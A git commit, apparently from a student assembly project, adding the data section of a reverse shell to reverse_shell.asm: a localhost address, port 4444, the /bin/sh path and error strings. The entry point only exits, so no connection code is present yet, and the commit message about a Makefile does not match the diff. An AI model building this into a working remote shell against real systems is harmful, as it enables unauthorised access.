4265c34b6c14494b8d604ecc07208272fd04f190
Guillaume Houriez <guillaume.houriez@epitech.eu>
2025-04-17 22:51:07 +0200

    [ADD] ajout d'un makefile pour compil, avec make, makefclean, make clean, make re

--- reverse_shell.asm
+++ reverse_shell.asm
@@ -14,3 +14,25 @@ section .data
     ; Config de la connexion
     ip dd 0x0100007f       ; 127.0.0.1 en format réseau (little-endian)
     port dw 0x5c11         ; Port 4444 (0x115c)
+
+    ; Messages d'erreur
+    error_socket db "Erreur lors de la création du socket", 10, 0
+    error_connect db "Erreur de connexion au serveur", 10, 0
+    
+    ; path pour shell
+    shell db "/bin/sh", 0
+    args db 0
+    env db 0
+
+section .bss
+    sockaddr_in resb 16
+
+section .text
+    global _start
+
+_start:
+
+    ; END
+    mov rax, SYS_EXIT
+    xor rdi, rdi
+    syscall
